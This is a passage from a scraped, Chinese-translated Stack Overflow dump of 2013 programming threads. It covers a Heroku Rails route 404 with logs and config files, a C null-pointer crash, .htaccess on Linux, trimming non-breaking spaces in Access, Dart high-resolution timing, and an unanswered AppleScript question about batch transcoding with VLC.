ation-01780e1cf08fc467414520399232647f.css host=peaceful-chamber-6371.herokuapp.
com fwd="110.32.193.201" dyno=web.1 connect=1ms service=32ms status=200 bytes=25
4629
2013-04-01T05:34:13+00:00 heroku[router]: at=info method=GET path=/assets/applic
ation-5909661ad10a83c2e0ae36fac77e7706.js host=peaceful-chamber-6371.herokuapp.c
om fwd="110.32.193.201" dyno=web.1 connect=1ms service=19ms status=200 bytes=128
395
2013-04-01T05:34:21+00:00 heroku[web.1]: Stopping all processes with SIGTERM
2013-04-01T05:34:22+00:00 app[web.1]:   /usr/local/lib/ruby/1.9.1/webrick/server
.rb:90:in `select'
2013-04-01T05:34:22+00:00 app[web.1]: [2013-04-01 05:34:22] ERROR SignalExceptio
n: SIGTERM
2013-04-01T05:34:33+00:00 heroku[web.1]: Stopping remaining processes with SIGKI
LL
2013-04-01T05:34:33+00:00 heroku[web.1]: Error R12 (Exit timeout) -> At least on
e process failed to exit within 10 seconds of SIGTERM
2013-04-01T05:34:35+00:00 heroku[web.1]: Process exited with status 137
2013-04-01T05:37:42+00:00 heroku[api]: Starting process with command `bundle exe
c rake db:migrate` by jeff.slim.gray@gmail.com
2013-04-01T05:37:45+00:00 heroku[run.2185]: Awaiting client
2013-04-01T05:37:45+00:00 heroku[run.2185]: Starting process with command `bundl
e exec rake db:migrate`
2013-04-01T05:37:46+00:00 heroku[run.2185]: State changed from starting to up
2013-04-01T05:37:54+00:00 heroku[run.2185]: Process exited with status 1
2013-04-01T05:37:54+00:00 heroku[run.2185]: State changed from up to complete
2013-04-01T05:38:00+00:00 heroku[web.1]: State changed from up to starting
2013-04-01T05:38:02+00:00 heroku[web.1]: Starting process with command `bundle e
xec rails server -p 47627`
2013-04-01T05:38:03+00:00 heroku[web.1]: Stopping all processes with SIGTERM
2013-04-01T05:38:04+00:00 app[web.1]: [2013-04-01 05:38:04] ERROR SignalExceptio
n: SIGTERM
2013-04-01T05:38:04+00:00 app[web.1]:   /usr/local/lib/ruby/1.9.1/webrick/server
.rb:90:in `select'
2013-04-01T05:38:06+00:00 app[web.1]: DEPRECATION WARNING: You have Rails 2.3-st
yle plugins in vendor/plugins! Support for these plugins will be removed in Rail
s 4.0\. Move them out and bundle them in your Gemfile, or fold them in to your ap
p as lib/myplugin/* and config/initializers/myplugin.rb. See the release notes f
or more on this: http://weblog.rubyonrails.org/2012/1/4/rails-3-2-0-rc2-has-been
-released. (called from <top (required)> at /app/config/environment.rb:5)
2013-04-01T05:38:06+00:00 app[web.1]: DEPRECATION WARNING: You have Rails 2.3-st
yle plugins in vendor/plugins! Support for these plugins will be removed in Rail
s 4.0\. Move them out and bundle them in your Gemfile, or fold them in to your ap
p as lib/myplugin/* and config/initializers/myplugin.rb. See the release notes f
or more on this: http://weblog.rubyonrails.org/2012/1/4/rails-3-2-0-rc2-has-been
-released. (called from <top (required)> at /app/config/environment.rb:5)
2013-04-01T05:38:10+00:00 app[web.1]: => Booting WEBrick
2013-04-01T05:38:10+00:00 app[web.1]: => Rails 3.2.12 application starting in pr
oduction on http://0.0.0.0:47627
2013-04-01T05:38:10+00:00 app[web.1]: => Call with -d to detach
2013-04-01T05:38:10+00:00 app[web.1]: => Ctrl-C to shutdown server
2013-04-01T05:38:10+00:00 app[web.1]: Connecting to database specified by DATABA
SE_URL
2013-04-01T05:38:10+00:00 app[web.1]: [2013-04-01 05:38:10] INFO  ruby 1.9.2 (20
11-07-09) [x86_64-linux]
2013-04-01T05:38:10+00:00 app[web.1]: [2013-04-01 05:38:10] INFO  WEBrick 1.3.1
2013-04-01T05:38:10+00:00 app[web.1]: [2013-04-01 05:38:10] INFO  WEBrick::HTTPS
erver#start: pid=2 port=47627
2013-04-01T05:38:11+00:00 heroku[web.1]: State changed from starting to up
2013-04-01T05:38:14+00:00 heroku[web.1]: Error R12 (Exit timeout) -> At least on
e process failed to exit within 10 seconds of SIGTERM
2013-04-01T05:38:14+00:00 heroku[web.1]: Stopping remaining processes with SIGKI
LL
2013-04-01T05:38:17+00:00 heroku[web.1]: Process exited with status 137
2013-04-01T05:38:36+00:00 heroku[router]: at=info method=GET path=/ host=peacefu
l-chamber-6371.herokuapp.com fwd="75.170.18.86" dyno=web.1 connect=6ms service=1
94ms status=404 bytes=728
2013-04-01T05:38:36+00:00 app[web.1]: Started GET "/" for 75.170.18.86 at 2013-0
4-01 05:38:35 +0000
2013-04-01T05:38:36+00:00 app[web.1]:
2013-04-01T05:38:36+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/railties-3
.2.12/lib/rails/rack/logger.rb:32:in `call_app'
2013-04-01T05:38:36+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/activesupp
ort-3.2.12/lib/active_support/tagged_logging.rb:22:in `tagged'
2013-04-01T05:38:36+00:00 app[web.1]: ActionController::RoutingError (No route m
atches [GET] "/"):
2013-04-01T05:38:36+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/railties-3
.2.12/lib/rails/rack/logger.rb:16:in `call'
2013-04-01T05:38:36+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/actionpack
-3.2.12/lib/action_dispatch/middleware/request_id.rb:22:in `call'
2013-04-01T05:38:36+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/activesupp
ort-3.2.12/lib/active_support/cache/strategy/local_cache.rb:72:in `call'
2013-04-01T05:38:36+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/actionpack
-3.2.12/lib/action_dispatch/middleware/show_exceptions.rb:56:in `call'
2013-04-01T05:38:36+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/railties-3
.2.12/lib/rails/rack/logger.rb:16:in `block in call'
2013-04-01T05:38:36+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/rack-1.4.5
/lib/rack/methodoverride.rb:21:in `call'
2013-04-01T05:38:36+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/rack-1.4.5
/lib/rack/lock.rb:15:in `call'
2013-04-01T05:38:36+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/actionpack
-3.2.12/lib/action_dispatch/middleware/debug_exceptions.rb:21:in `call'
2013-04-01T05:38:36+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/rack-cache
-1.2/lib/rack/cache/context.rb:136:in `forward'
2013-04-01T05:38:36+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/rack-cache
-1.2/lib/rack/cache/context.rb:245:i
n `fetch'
2013-04-01T05:38:36+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/rack-cache
-1.2/lib/rack/cache/context.rb:66:in `call!'
2013-04-01T05:38:36+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/railties-3
.2.12/lib/rails/engine.rb:479:in `call'
2013-04-01T05:38:36+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/rack-cache
-1.2/lib/rack/cache/context.rb:51:in `call'
2013-04-01T05:38:36+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/railties-3
.2.12/lib/rails/application.rb:223:in `call'
2013-04-01T05:38:36+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/rack-1.4.5
/lib/rack/content_length.rb:14:in `call'
2013-04-01T05:38:36+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/rack-1.4.5
/lib/rack/runtime.rb:17:in `call'
2013-04-01T05:38:36+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/rack-cache
-1.2/lib/rack/cache/context.rb:185:in `lookup'
2013-04-01T05:38:36+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/actionpack
-3.2.12/lib/action_dispatch/middleware/static.rb:62:in `call'
2013-04-01T05:38:36+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/railties-3
.2.12/lib/rails/rack/log_tailer.rb:17:in `call'
2013-04-01T05:38:36+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/rack-1.4.5
/lib/rack/handler/webrick.rb:59:in `service'
2013-04-01T05:38:36+00:00 app[web.1]:   /usr/local/lib/ruby/1.9.1/webrick/httpse
rver.rb:111:in `service'
2013-04-01T05:38:36+00:00 app[web.1]:   /usr/local/lib/ruby/1.9.1/webrick/httpse
rver.rb:70:in `run'
2013-04-01T05:38:36+00:00 app[web.1]:
2013-04-01T05:38:36+00:00 app[web.1]:   /usr/local/lib/ruby/1.9.1/webrick/server
.rb:183:in `block in start_thread'
2013-04-01T05:38:36+00:00 app[web.1]:
2013-04-01T05:39:44+00:00 app[web.1]: Started GET "/" for 75.170.18.86 at 2013-0
4-01 05:39:44 +0000
2013-04-01T05:39:44+00:00 app[web.1]:
2013-04-01T05:39:44+00:00 app[web.1]: ActionController::RoutingError (No route m
atches [GET] "/"):
2013-04-01T05:39:44+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/actionpack
-3.2.12/lib/action_dispatch/middleware/debug_exceptions.rb:21:in `call'
2013-04-01T05:39:44+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/actionpack
-3.2.12/lib/action_dispatch/middleware/show_exceptions.rb:56:in `call'
2013-04-01T05:39:44+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/railties-3
.2.12/lib/rails/rack/logger.rb:32:in `call_app'
2013-04-01T05:39:44+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/railties-3
.2.12/lib/rails/rack/logger.rb:16:in `block in call'
2013-04-01T05:39:44+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/activesupp
ort-3.2.12/lib/active_support/tagged_logging.rb:22:in `tagged'
2013-04-01T05:39:44+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/railties-3
.2.12/lib/rails/rack/logger.rb:16:in `call'
2013-04-01T05:39:44+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/actionpack
-3.2.12/lib/action_dispatch/middleware/request_id.rb:22:in `call'
2013-04-01T05:39:44+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/rack-1.4.5
/lib/rack/methodoverride.rb:21:in `call'
2013-04-01T05:39:44+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/rack-1.4.5
/lib/rack/runtime.rb:17:in `call'
2013-04-01T05:39:44+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/activesupp
ort-3.2.12/lib/active_support/cache/strategy/local_cache.rb:72:in `call'
2013-04-01T05:39:44+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/rack-1.4.5
/lib/rack/lock.rb:15:in `call'
2013-04-01T05:39:44+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/actionpack
-3.2.12/lib/action_dispatch/middleware/static.rb:62:in `call'
2013-04-01T05:39:44+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/rack-cache
-1.2/lib/rack/cache/context.rb:136:in `forward'
2013-04-01T05:39:44+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/rack-cache
-1.2/lib/rack/cache/context.rb:245:in `fetch'
2013-04-01T05:39:44+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/rack-cache
-1.2/lib/rack/cache/context.rb:185:in `lookup'
2013-04-01T05:39:44+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/rack-cache
-1.2/lib/rack/cache/context.rb:51:in `call'
2013-04-01T05:39:44+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/rack-cache
-1.2/lib/rack/cache/context.rb:66:in `call!'
2013-04-01T05:39:44+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/railties-3
.2.12/lib/rails/engine.rb:479:in `call'
2013-04-01T05:39:44+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/railties-3
.2.12/lib/rails/application.rb:223:in `call'
2013-04-01T05:39:44+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/rack-1.4.5
/lib/rack/content_length.rb:14:in `call'
2013-04-01T05:39:44+00:00 heroku[router]: at=info method=GET path=/ host=peacefu
l-chamber-6371.herokuapp.com fwd="75.170.18.86" dyno=web.1 connect=2ms service=4
6ms status=404 bytes=728
2013-04-01T05:39:44+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/railties-3
.2.12/lib/rails/rack/log_tailer.rb:17:in `call'
2013-04-01T05:39:44+00:00 app[web.1]:   /usr/local/lib/ruby/1.9.1/webrick/httpse
rver.rb:111:in `service'
2013-04-01T05:39:44+00:00 app[web.1]:   /usr/local/lib/ruby/1.9.1/webrick/server
.rb:183:in `block in start_thread'
2013-04-01T05:39:44+00:00 app[web.1]:   /usr/local/lib/ruby/1.9.1/webrick/httpse
rver.rb:70:in `run'
2013-04-01T05:39:44+00:00 app[web.1]:
2013-04-01T05:39:44+00:00 app[web.1]:   vendor/bundle/ruby/1.9.1/gems/rack-1.4.5
/lib/rack/handler/webrick.rb:59:in `service'
2013-04-01T05:39:44+00:00 app[web.1]:
2013-04-01T05:39:54+00:00 app[web.1]: Started GET "/leads" for 110.32.193.201 at
 2013-04-01 05:39:54 +0000
2013-04-01T05:39:54+00:00 app[web.1]: Processing by LeadsController#index as HTM
L
2013-04-01T05:39:54+00:00 app[web.1]:   Rendered leads/index.html.erb within lay
outs/application (12.6ms)
2013-04-01T05:39:54+00:00 app[web.1]: Completed 200 OK in 207ms (Views: 60.8ms |
 ActiveRecord: 60.4ms)
2013-04-01T05:39:54+00:00 heroku[router]: at=info method=GET path=/leads host=pe
aceful-chamber-6371.herokuapp.com fwd="110.32.193.201" dyno=web.1 connect=1ms se
rvice=228ms status=304 bytes=0 
```

生产.rb

```
 BoothLeads::Application.configure do
  # Settings specified here will take precedence over those in config/application.rb

  # Code is not reloaded between requests
  config.cache_classes = true

  # Full error reports are disabled and caching is turned on
  config.consider_all_requests_local       = false
  config.action_controller.perform_caching = true

  # Disable Rails's static asset server (Apache or nginx will already do this)
  config.serve_static_assets = false

  # Compress JavaScripts and CSS
  config.assets.compress = true

  # Don't fallback to assets pipeline if a precompiled asset is missed
  config.assets.compile = true

  # Generate digests for assets URLs
  config.assets.digest = true

  # Defaults to nil and saved in location specified by config.assets.prefix
  # config.assets.manifest = YOUR_PATH

  # Specifies the header that your server uses for sending files
  # config.action_dispatch.x_sendfile_header = "X-Sendfile" # for apache
  # config.action_dispatch.x_sendfile_header = 'X-Accel-Redirect' # for nginx

  # Force all access to the app over SSL, use Strict-Transport-Security, and use secure cookies.
  # config.force_ssl = true

  # See everything in the log (default is :info)
  # config.log_level = :debug

  # Prepend all log lines with the following tags
  # config.log_tags = [ :subdomain, :uuid ]

  # Use a different logger for distributed setups
  # config.logger = ActiveSupport::TaggedLogging.new(SyslogLogger.new)

  # Use a different cache store in production
  # config.cache_store = :mem_cache_store

  # Enable serving of images, stylesheets, and JavaScripts from an asset server
  # config.action_controller.asset_host = "http://assets.example.com"

  # Precompile additional assets (application.js, application.css, and all non-JS/CSS are already added)
  # config.assets.precompile += %w( search.js )

  # Disable delivery errors, bad email addresses will be ignored
  # config.action_mailer.raise_delivery_errors = false

  # Enable threaded mode
  # config.threadsafe!

  # Enable locale fallbacks for I18n (makes lookups for any locale fall back to
  # the I18n.default_locale when a translation can not be found)
  config.i18n.fallbacks = true

  # Send deprecation notices to registered listeners
  config.active_support.deprecation = :notify

  # Log the query plan for queries taking more than this (works
  # with SQLite, MySQL, and PostgreSQL)
  # config.active_record.auto_explain_threshold_in_seconds = 0.5
end 
```

发展.rb

```
BoothLeads::Application.configure do
  # Settings specified here will take precedence over those in config/application.rb

  # In the development environment your application's code is reloaded on
  # every request. This slows down response time but is perfect for development
  # since you don't have to restart the web server when you make code changes.
  config.cache_classes = false

  # Log error messages when you accidentally call methods on nil.
  config.whiny_nils = true

  # Show full error reports and disable caching
  config.consider_all_requests_local       = true
  config.action_controller.perform_caching = false

  # Don't care if the mailer can't send
  config.action_mailer.raise_delivery_errors = false

  # Print deprecation notices to the Rails logger
  config.active_support.deprecation = :log

  # Only use best-standards-support built into browsers
  config.action_dispatch.best_standards_support = :builtin

  # Raise exception on mass assignment protection for Active Record models
  config.active_record.mass_assignment_sanitizer = :strict

  # Log the query plan for queries taking more than this (works
  # with SQLite, MySQL, and PostgreSQL)
  config.active_record.auto_explain_threshold_in_seconds = 0.5

  # Do not compress assets
  config.assets.compress = false

  # Expands the lines which load the assets
  config.assets.debug = true
end 
```

Cat/Config/Routes.rb

```
C:\Users\Jeff Gray\RubymineProjects\BoothLeads>heroku run cat config/routes.rb
Running `cat config/routes.rb` attached to terminal... up, run.2943
BoothLeads::Application.routes.draw do
  resources :solds

  resources :leads

  # The priority is based upon order of creation:
  # first created -> highest priority.

  # Sample of regular route:
  #   match 'products/:id' => 'catalog#view'
  # Keep in mind you can assign values other than :controller and :action

  # Sample of named route:
  #   match 'products/:id/purchase' => 'catalog#purchase', :as => :purchase
  # This route can be invoked with purchase_url(:id => product.id)

  # Sample resource route (maps HTTP verbs to controller actions automatically):

  #   resources :products

  # Sample resource route with options:
  #   resources :products do
  #     member do
  #       get 'short'
  #       post 'toggle'
  #     end
  #
  #     collection do
  #       get 'sold'
  #     end
  #   end

  # Sample resource route with sub-resources:
  #   resources :products do
  #     resources :comments, :sales
  #     resource :seller
  #   end

  # Sample resource route with more complex sub-resources
  #   resources :products do
  #     resources :comments
  #     resources :sales do
  #       get 'recent', :on => :collection
  #     end
  #   end

  # Sample resource route within a namespace:
  #   namespace :admin do
  #     # Directs /admin/products/* to Admin::ProductsController
  #     # (app/controllers/admin/products_controller.rb)
  #     resources :products
  #   end

  # You can have the root of your site routed with "root"
  # just remember to delete public/index.html.
  # root :to => 'welcome#index'

  # See how all your routes lay out with "rake routes"

  # This is a legacy wild controller route that's not recommended for RESTful ap
plications.
  # Note: This route will make all actions in every controller accessible via GE
T requests.
  # match ':controller(/:action(/:id))(.:format)'
end 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-01T05:33:11.550

您的页面实际上正在出现（尝试[http://peaceful-chamber-6371.herokuapp.com/leads](http://peaceful-chamber-6371.herokuapp.com/leads)），只是没有为根定义路由（[http://peaceful-chamber-6371.herokuapp.com/](http://peaceful-chamber-6371.herokuapp.com/)）。

由于您打算将其作为单页站点，因此我将“移动”到根目录：

```
BoothLeads::Application.routes.draw do
   resources :leads, path: ''
end 
```

这将使您的潜在客户在本地 localhost:3000 和Heroku上的[http://peaceful-chamber-6371.herokuapp.com/上可用。](http://peaceful-chamber-6371.herokuapp.com/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-01T05:31:41.583

你迁移数据库了吗？

```
heroku run rake db:migrate 
```

您是否扩展了您的应用程序？

```
heroku ps:scale web=1 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-08-11T02:43:08.370

你在运行 Rails 4.0 吗？如果是这样，您的应用程序是否处于早期阶段并且仍在使用默认的 Rails 应用程序页面作为主页/根？如果是这样，在 Rails 4 中这个静态页面不再存在，并且一旦迁移到 Heroku 就会出现 404 错误。要修复它，您需要定义一个实际的主页，并在路由文件中设置根。

# iphone - 线程 1：程序接收信号：“EXC_BAD_ACCESS”

> ID：15738042
> 
> 赞同：0
> 
> 时间：2013-04-01T05:22:22.833
> 
> 标签：iphone, objective-c, xcode, exc-bad-access

正如标题所说，我有这个错误我将不胜感激帮助我我的代码在下面

这是在 BTscan.c

```
t_btmanager     *bt_accessor(t_btmanager *tmp)
{
static t_btmanager  *bt_tmp = 0;
if (tmp)
bt_tmp = tmp;
return (bt_tmp);
}

int bt_scan()

{
bt_accessor(0)->status = 1;  ////Here's the problem
printf("registering hooks ...\n");
return (0);
} 
```

这个在 BTscan.h

```
typedef struct  s_btmanager
{
char        status;
}       t_btmanager; 
```

谢谢你的帮助

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T05:25:59.053

`bt_tmp``0`将保持`tmp`原样`0`。所以它变成了`NULL` 指针，取消引用空指针`bt_accessor(0)->status`会导致异常。因为内存地址`0x0`是禁止访问的。

我不确定`EXC_BAD_ACCESS`异常来自哪里，但我猜它来自 Mach 内核虚拟内存管理器。

# php - .htaccess 在 Linux 上不起作用

> ID：15738043
> 
> 赞同：3
> 
> 时间：2013-04-01T05:22:30.140
> 
> 标签：php, linux, windows, .htaccess

我在 .htaccess 文件中定义了一些 URL 重写规则

它在 Windows 的本地主机上工作正常

但是当我将它上传到基于 linux 的服务器上时，它停止工作我在这个[链接上发现了问题](http://smartwebdeveloper.com/apache/htaccess-problems)

> 以点开头的文件和目录名称被 Unix、Linux 和 Mac 视为隐藏文件。htaccess 文件是隐藏的，因此它不会分散对 HTML 文件等普通 Web 内容的注意力。有关详细信息，请参阅隐藏文件。如果没有开头的点，Apache 将忽略 htaccess 文件。

但是我没有找到解决方案...

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-01T05:24:24.420

确保在 httpd.conf 中启用了 AllowOverride（AllowOverride all）（许多发行版默认为 none）

如果不是这样，您可能需要发布实际的 htaccess 以获得更多帮助

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-01T06:23:03.050

确保模块“mod_rewrite”已加载到您的服务器中。要检查这一点，请使用 phpinfo()，然后搜索“加载的模块”。

# ms-access - 通过 VBScript 从文本中删除尾随的不可见字符

> ID：15738045
> 
> 赞同：3
> 
> 时间：2013-04-01T05:22:35.710
> 
> 标签：ms-access, utf-8, vbscript

我正在抓取一些 Web 数据并插入 Access 2007。使用 .vbs 脚本来获取和插入数据。一切都很好，直到最近升级了报废程序。

每个文本记录的末尾都有一个额外的空间。似乎与编码有关。

修剪 - 功能不适用于此。
尝试替换 A (Circumflex) 和 xA0 ，没有结果。

正在做 - Left(mystring,len(mystring)-1) 现在。

既然我要抓取数百万条记录，那么解决这个问题的最简单和正确的方法是什么？

此外，如何纠正这一点，因为 Access 中的现有数据现在将包含此类“受污染”数据？使用 UPDATE 语句？如何检查最后一个字符是否为空格？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-01T05:50:33.300

`Trim()`将删除尾随空格。因此，如果您的字符串值以看起来像空格的东西结尾，但没有被 删除`Trim()`，那么它实际上可能不是空格字符。另一种可能性是一个空格，后面跟着一个不可见的字符。

无论哪种方式，知道最后一个字符实际上是什么都会很有用。

```
SELECT Asc(Right(your_string, 1)) AS ascii_value
FROM YourTable; 
```

一旦你知道那个角色是什么，你就可以决定如何最好地摆脱它。

我不知道对你来说*最好*的方法是什么。从评论中出现的细节来看，麻烦的字符似乎是一个不间断的空格，ASCII 160。当它出现在字符串的末尾时，你想丢弃它。在这种情况下，也许您还想丢弃在不间断空格之前的任何常规空格字符。但是，如果字符串中的其他地方存在不间断空格，则您希望保留这些空格。

此外，您似乎希望对存储在 Access 表中的现有数据以及使用 VBScript 抓取过程收集的新传入数据执行此操作。在 VBScript 中，查询不能使用自定义 VBA 函数或`Replace()`函数。所以我不知道在没有看到你的抓取代码的情况下对新数据说什么。对于现有数据，您可以使用`UPDATE`类似于您在问题中建议的语句，该语句应该在 VBScript 或 Access 会话中工作。

```
UPDATE YourTable
SET your_string = Left(your_string, Len(your_string) -1)
WHERE Asc(Right(your_string, 1)) = 160; 
```

如果您还想丢弃尾随不间断空格之前存在的任何空格，请合并`Trim()`.

```
UPDATE YourTable
SET your_string = Trim(Left(your_string, Len(your_string) -1))
WHERE Asc(Right(your_string, 1)) = 160; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-01T11:17:37.210

以下 Access VBA 模块代码将为您提供一个名为的函数`myRTrim()`，您可以在 UPDATE 查询中使用该函数来修复现有记录，例如，

更新 [MyTable] SET [MyField]=myRTrim([MyField])

```
Option Compare Database
Option Explicit

Public Function myRTrim(source As Variant) As Variant
    Dim newLength As Long
    If IsNull(source) Then
        myRTrim = Null
    Else
        newLength = Len(source)
        Do While newLength > 0
            If Not IsCharToTrim(Mid(source, newLength, 1)) Then
                Exit Do
            End If
            newLength = newLength - 1
        Loop
        myRTrim = Left(source, newLength)
    End If
End Function

Private Function IsCharToTrim(testChar As String) As Boolean
    Select Case testChar
        '' characters to trim - add to this list if required
        Case " ", Chr(255), Chr(9), Chr(160)
            IsCharToTrim = True
        Case Else
            IsCharToTrim = False
    End Select
End Function 
```

对于新的抓取，您可以将相同的功能添加到您的 VBScript 代码中。或者，您可以将您的 VBScript 代码带入 Access，为 VBA 调整它（如果需要），然后在那里使用它。

# dart - 有什么比 Dart Web 应用程序中的新 DateTime 更精确的呢？

> ID：15738046
> 
> 赞同：6
> 
> 时间：2013-04-01T05:22:38.147
> 
> 标签：dart

获得一个新`DateTime`的对我来说不够准确。浏览器中的日期对象以整数形式给我毫秒。我希望能够获得比标准日期对象更精确的时间。这可能吗？我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-01T05:22:38.147

用于`window.performance.now()`获得单调、高分辨率的时间。该`now()`函数以小数形式返回带有微秒的双精度数。

这是一个例子：

```
import 'dart:html';

main() {
  var time = window.performance.now();
  print(time); // 12123.24341221
} 
```

请注意，这`now()`不是典型的“从纪元开始的时间”。相反，它是`window.performance.timing.navigationStart`.

该`navigationStart`字段定义为（来自[规范](http://www.w3.org/TR/navigation-timing/#dom-performancetiming-navigationstart)）：

> 此属性必须在用户代理完成提示卸载前一个文档后立即返回时间。如果没有以前的文档，则此属性必须返回与 fetchStart 相同的值。

时间戳很棒，`window.performance.now()`因为它不受时钟偏差的影响，并且比获取新的`DateTime`.

如果您的应用程序是由驱动的`requestAnimationFrame`（如果不是，为什么不呢？:) 那么您已经有了一个高分辨率的时间戳！

`animationFrame`以高分辨率时间戳完成的 Future 返回：

```
Future<num> animationFrame; 
```

你可以像这样使用它：

```
gameLoop(num highResolutionTime) {
  // stuff
  window.animationFrame.then(gameLoop);
}

main() {
  window.animationFrame.then(gameLoop);
} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-04-01T12:37:55.880

如果要测量时间跨度，请使用`Stopwatch`该类。它可以通用（在客户端和服务器上）并且应该提供最好的解决方案。

```
var sw = new Stopwatch()..start();
doSomething();
print(sw.elapsed);
print(sw.elapsedMicroseconds); 
```

目前（截至 2013 年 4 月）浏览器中的秒表尚未使用该`window.performance`功能，但这是一个[错误](https://dartbug.com/9565)，应该修复。与此同时，您可以使用 Seth 建议的解决方法。

# applescript - 使用 VLC (mac) 对 MXF 视频文件进行转码的批处理脚本

> ID：15738052
> 
> 赞同：1
> 
> 时间：2013-04-01T05:23:13.867
> 
> 标签：applescript, osx-mountain-lion, vlc, batch-processing, transcode

我以为今天早上我找到了解决我头疼的问题，但显然我在编码方面不够聪明：http: [//forum.videolan.org/viewtopic.php? f=12&t=98694](http://forum.videolan.org/viewtopic.php?f=12&t=98694)

我的问题如下：我是一名视频编辑器，上周我的 RAID NAS 中的两个驱动器都崩溃了。我已经能够恢复 500GB 的视频，但丢失了索引，因此所有文件都丢失了它们的引用，其中一些文件已损坏且存在错误。无论他们处于哪个阶段，唯一能够阅读他们的应用程序是 VLC（顺便说一句，多年来最好的播放器）。所以它会读取我的所有文件，奇迹般的是它还具有一个集成的转码向导，这是迄今为止质量最高的向导：当我以高比特率压缩的 .ts 格式输出时，我没有质量损失，最重要的是它在首映 CS6，所以即使我所有的文件都在商店里，我在某个地方找到了恢复它们的方法，并且能够将它们发送到我的视频编辑程序中！

唯一的问题 VLC 不进行批量转码，这个问题涉及 3000 个视频文件，需要将其原始（现已恢复但已损坏）.MXF 转换为高质量的 Mpeg.ts（可在 Premiere Pro CS6 中编辑）。

我在这个论坛中发现：http: [//forum.videolan.org/viewtopic.php?](http://forum.videolan.org/viewtopic.php?f=12&t=98694) f=12&t= 98694 一种可以使用applescript droplet 简化批处理自动化的方法。

所以我遵循了帖子中的信息，但没有运气，我的编码真的很糟糕。

如果我能把它变成我的，这个线程的承诺对我来说非常有吸引力，他们说通过创建和苹果脚本应用程序，我可以将视频文件放到应用程序上，它应该打开 VLC 并转码......比通过向导，键入并单击所有设置并启动转码 x3000 视频文件：S

所以理想情况下（我现在的梦想！！）我很乐意这样做或更好地在应用程序图标上放置一个文件夹，并以新的可编辑格式在另一个文件夹中以相同的文件名输出它！

所以如果他们是熟悉苹果脚本的人，请帮忙，我想我快到了，这可能是我错误的源和目标路径！请帮忙！！

**这是他们提供的代码：**

```
on open these_items
   try
      process_item(these_items)
   end try
end open

-- this sub-routine processes files 
on process_item(this_item)
   set full_path to the POSIX path of this_item
   do shell script "/Applications/VLC.app/Contents/MacOS/VLC" & " '" & full_path & "' --sout='#transcode{vcodec=h264,vb=800,acodec=mp4a,ab=192}:standard{access=file,mux=mp4,dst=" & full_path & ".mp4}'"
end process_item 
```

**这是 VLC 为我提供的关于我的转码输出文件格式的脚本：**

```
:sout=#transcode{vcodec=mp2v,vb=3072,acodec=mp4a,ab=256}:standard{mux=ts,dst=/Volumes/Untitled/EarthFreq_2013/EF2013_0132.ts,access=file} 
```

**这就是我想要做的（混合两者）：**

```
on open these_items
    try
        process_item(these_items)
    end try
end open

-- this sub-routine processes files
on process_item(this_item)
    set full_path to the POSIX path of this_item
    do shell script "/Applications/VLC.app/Contents/MacOS/VLC" & " '" & volume/Macintosh HD/Users/GANDA/Desktop/sourcefolder & "' --sout='#transcode{vcodec=mp2v,vb=3072,acodec=mp4a,ab=256}:standard{access=file,mux=ts,dst=" & volume/Macintosh HD/Users/GANDA/Desktop/destinationfolder & ".ts}'"
end process_item 
```

我很确定我不是那么远..但也许我是？我是一名视频编辑，不是编码员，我希望能够了解更多，但请给我一点时间，我保证我会在死前到达那里！

有人懂我吗？？告诉我我并不孤单！

和平

诺利

* * *

## 回答 #1

> 赞同：0
> 
